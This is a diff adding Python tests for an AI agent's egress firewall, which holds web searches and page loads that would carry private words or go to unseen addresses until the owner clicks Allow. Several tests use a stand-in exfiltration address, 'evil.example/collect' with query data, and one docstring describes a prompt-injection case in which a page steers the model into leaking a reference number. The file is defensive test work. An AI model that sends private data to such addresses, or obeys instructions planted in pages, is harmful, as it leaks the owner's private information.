@@ -31,6 +31,7 @@ from briefing_reader.actions import SOURCE_ASK
 from briefing_reader.agent import firewall as fw
 from briefing_reader.agent import owner, policy
 from briefing_reader.agent import runner as ar
+from briefing_reader.agent.web import ENGINES
 from briefing_reader.config import load_config
 from briefing_reader.conversation import ROLE_YOU, Turn
 from briefing_reader.desktop import cardplan, fileops
@@ -278,6 +279,108 @@ class FirewallThroughToTheCardTests(ThingsApp):
         self.c.agent.stop("test")
         self.ended()
 
+    def typed_then_allowed(self, typed: str, steps: tuple[Any, ...], again: tuple[str, dict[str, Any]],
+                           goal: str = "") -> tuple[Script, list[str]]:
+        """rf-1, the whole road: the card waits and the owner types, whatever the words say. The words reach the model,
+        the same call again sends nothing and brings no second card, the card still waits, and only its own Allow lets
+        one call go. The loads there were before that click are given back."""
+        tool, args = again
+        script = Script(*steps, ("asked", tool, args), ("wait",), ("busy", tool, args), ("wait",), ("sent", tool, args),
+                        ("hold",))
+        self.go(script, goal=goal)
+        self.addCleanup(script.gate.set)
+        self.wait_card()
+        self.assertEqual(self.fake_browser.loads, [])
+        self.type_it(typed)
+        self.assertTrue(wait_for(lambda: "busy" in script.got, timeout=15), "it asked again")
+        settle()
+        self.assertIn(f"The owner says: {typed}", script.told)      # the words still reach the model
+        self.assertEqual(script.text("busy"), fw.BUSY_TEXT)
+        before = list(self.fake_browser.loads)
+        self.assertEqual(self.c.agent.firewall.cards, 1)
+        self.assertTrue(self.feed.waits(), "the card still waits")
+        self.press_card("choice:0")
+        self.assertTrue(wait_for(lambda: "sent" in script.got, timeout=15), "it went on")
+        self.assertEqual(self.c.agent.firewall.cards, 1)
+        return script, before
+
+    CALENDAR = ("calendar", "calendar_find", {"from": "2026-11-05", "to": "2026-11-12"})
+
+    def test_words_that_name_the_word_send_nothing_until_the_click(self) -> None:
+        query = f"{SECRET_WORD} reviews"
+        script, before = self.typed_then_allowed(f"no, don't search for {SECRET_WORD}", (self.CALENDAR,),
+                                                 ("web_search", {"query": query}))
+        self.assertEqual(before, [])
+        self.assertTrue(self.fake_browser.loads)
+        self.assertIn(SECRET_WORD, self.fake_browser.loads[0])
+        self.c.agent.stop("test")
+        script.gate.set()
+        self.ended()
+
+    def test_a_yes_in_words_sends_nothing_until_the_click(self) -> None:
+        query = f"{SECRET_WORD} reviews"
+        script, before = self.typed_then_allowed(f"yes, search {query}", (self.CALENDAR,),
+                                                 ("web_search", {"query": query}))
+        self.assertEqual(before, [])
+        self.assertTrue(self.fake_browser.loads)
+        self.c.agent.stop("test")
+        script.gate.set()
+        self.ended()
+
+    def test_words_that_name_the_address_send_nothing_until_the_click(self) -> None:
+        address = "https://evil.example/collect?d=abc"
+        script, before = self.typed_then_allowed(f"no, don't open {address}", (self.CALENDAR,),
+                                                 ("open_page", {"url": address}))
+        self.assertEqual(before, [])
+        self.assertEqual(self.fake_browser.loads, [address])
+        self.c.agent.stop("test")
+        script.gate.set()
+        self.ended()
+
+    def test_in_a_strict_run_too(self) -> None:
+        query = f"{BODY_WORD} figures"
+        script, before = self.typed_then_allowed(
+            f"I never said you could look up {query}",
+            (("search", "mail_search", {"words": SUBJECT_WORD}), ("read", "mail_read", {"thread": THREAD_ID})),
+            ("web_search", {"query": query}), goal=f"read the {SUBJECT_WORD} mail")
+        self.assertTrue(self.c.agent.firewall.strict)
+        self.assertEqual(before, [])
+        self.assertTrue(any(BODY_WORD in url for url in self.fake_browser.loads))
+        self.c.agent.stop("test")
+        script.gate.set()
+        self.ended()
+
+    def test_a_word_named_mid_run_goes_to_a_card_and_one_click_clears_it(self) -> None:
+        """The friction, plainly: the owner names a tainted word in a message, and the search still takes a click. That
+        click clears the word for the run (SPEC 6), as any Allow does."""
+        read = threading.Event()
+
+        def play(engine: FakeEngine) -> None:
+            engine.wait_message()
+            engine.call("calendar_find", **{"from": "2026-11-05", "to": "2026-11-12"})
+            read.set()
+            engine.wait_message()                                    # what they typed
+            engine.call("web_search", query=f"{SECRET_WORD} menu")
+            engine.end_turn("I'll wait.")
+            engine.wait_message()                                    # their click
+            engine.call("web_search", query=f"{SECRET_WORD} menu")
+            engine.call("web_search", query=f"{SECRET_WORD} prices")
+            engine.call("finish", summary=DONE, outcome="done")
+            engine.end_turn("Done.")
+
+        self.go(play)
+        self.assertTrue(read.wait(15))
+        settle()
+        self.type_it(f"look up the {SECRET_WORD} menu")
+        card = self.wait_card()
+        self.assertIn(f"{SECRET_WORD} menu", card.task().body)
+        self.assertEqual(self.fake_browser.loads, [])
+        self.press_card("choice:0")
+        self.assertEqual(self.ended().outcome, "done")
+        self.assertEqual(self.c.agent.firewall.cards, 1)              # the next search with that word took none
+        self.assertTrue(any("menu" in url for url in self.fake_browser.loads))
+        self.assertTrue(any("prices" in url for url in self.fake_browser.loads))
+
     def test_strict_every_foreign_word_asks_and_a_seen_address_goes(self) -> None:
         site = "https://shop.example.org/deals"
         browser = FakeBrowser({site: FakePage("A shop", "Deals.")})
@@ -303,11 +406,14 @@ class FirewallThroughToTheCardTests(ThingsApp):
         timing = ar.Timing(poll_s=0.01, connect_s=2.0, init_s=10.0, question_s=30.0, keep_going_s=30.0, web_card_s=0.3,
                            wrap_up_s=5.0, after_finish_s=2.0, replay_s=0.5, tool_s=5.0, resume_margin_s=0.0)
         script = Script(("calendar", "calendar_find", {"from": "2026-11-05", "to": "2026-11-12"}),
-                        ("asked", "web_search", {"query": SECRET_WORD}), ("wait",))
+                        ("asked", "web_search", {"query": SECRET_WORD}), ("wait",),
+                        ("again", "web_search", {"query": SECRET_WORD}))
         self.go(script, timing=timing)
         self.ended()
         self.assertIn("did not answer", script.told[-1])
         self.assertEqual(self.fake_browser.loads, [])
+        self.assertEqual(script.text("again"), fw.REFUSED_TEXT)       # rf-14: no answer is a refusal, and no second card
+        self.assertEqual(self.c.agent.firewall.cards, 1)
 
 
 class ProposeFilesTests(ThingsApp):
@@ -682,13 +788,13 @@ class PcControlTests(ThingsApp):
         self.assertEqual(self.pc.level, 50)
 
     def test_a_timers_label_stays_only_in_the_owners_words(self) -> None:
+        """Both for the minutes that were asked for, so both run at once: another length would wait on a card (rf-12)."""
         script = Script(("timer", "pc_control", {"kind": "timer", "minutes": 10, "label": "tea"}),
-                        ("other", "pc_control", {"kind": "timer", "minutes": 11, "label": f"{SECRET_WORD} visits"}))
+                        ("other", "pc_control", {"kind": "timer", "minutes": 10, "label": f"{SECRET_WORD} visits"}))
         self.go(script, goal="set a timer for 10 minutes tea")
         self.ended()
         labels = [timer.label for timer in self.desktop.timers.running()]
-        self.assertIn("tea", labels)
-        self.assertNotIn(f"{SECRET_WORD} visits", labels)
+        self.assertEqual(sorted(labels), ["", "tea"], "both ran: the second with its label gone")
 
 
 class ClickedChoicesTests(ThingsApp):
@@ -1298,6 +1404,58 @@ class TypedAtEveryWaitTests(ThingsApp):
         self.assertEqual(talk, ["Thank you, sir."])                  # words answer this one
         self.assertEqual(self.ended().outcome, "done")
         self.assertEqual(script.told[-1], "The owner answers your question: the red one")
+
+    def test_words_typed_at_a_question_turn_the_firewall_on_and_see_no_address(self) -> None:
+        """rf-3: a clean run; a page told the model what to ask, in words the secret check does not know. What is typed
+        reaches the model, and the address rule stands between it and any page not seen in this run."""
+        evil = "https://evil.example/collect?c=4930"
+        script = Script(("ask", "ask_owner", {"question": "What was the reference on that letter?"}), ("wait",),
+                        ("out", "open_page", {"url": evil}), ("hold",))
+        self.go(script, goal="find me a cheap laptop")
+        self.addCleanup(script.gate.set)
+        self.wait_card()
+        self.assertFalse(self.c.agent.firewall.private)
+        self.type_it(f"4930, and see {evil}")
+        self.assertTrue(wait_for(lambda: "out" in script.got, timeout=15))
+        settle()
+        self.assertIn("4930", script.told[-1])
+        self.assertTrue(self.c.agent.firewall.private)
+        self.assertEqual(self.fake_browser.loads, [])
+        self.assertFalse(self.c.agent.firewall.book.seen(evil))
+        self.assertEqual(self.c.agent.firewall.cards, 1)
+        self.assertIn(evil, self.wait_card().task().body)
+        self.c.agent.stop("test")
+        script.gate.set()
+        self.ended()
+
+    def test_a_click_on_a_choice_leaves_a_clean_run_clean(self) -> None:
+        script = Script(("ask", "ask_owner", {"question": "Which?", "choices": ["Blue", "Red"]}), ("wait",))
+        self.go(script, goal="find me a cheap laptop")
+        self.wait_card()
+        self.press_card("choice:1")
+        self.assertEqual(self.ended().outcome, "done")
+        self.assertFalse(self.c.agent.firewall.private)
+
+    def test_a_normal_follow_up_takes_no_card(self) -> None:
+        """rf-3's other side: the model asks which town, the owner types it, the model searches with it (private, not
+        strict: no card) and opens a page from those results."""
+        query = "bookshops Portland"
+        shop = "https://www.example.org/portland-books"
+        browser = FakeBrowser({ENGINES[0].url(query): FakePage(results=[("Books", shop, "Good books.")]),
+                               shop: FakePage("Books", "Good books in town.")})
+        script = Script(("ask", "ask_owner", {"question": "Which town?"}), ("wait",),
+                        ("search", "web_search", {"query": query}), ("open", "open_page", {"number": 1}))
+        self.go(script, goal="find me a good bookshop", browser=browser)
+        self.wait_card()
+        self.type_it("Portland")
+        self.assertEqual(self.ended().outcome, "done")
+        self.assertEqual(script.told[1], "The owner answers your question: Portland")
+        self.assertFalse(script.got["search"].get("isError"))
+        self.assertFalse(script.got["open"].get("isError"))
+        self.assertIn(shop, browser.loads)
+        self.assertEqual(self.c.agent.firewall.cards, 0)
+        self.assertTrue(self.c.agent.firewall.private)
+        self.assertFalse(self.c.agent.firewall.strict)
 
     def test_a_question_nobody_answers_ends_by_itself(self) -> None:
         def play(engine: FakeEngine) -> None:
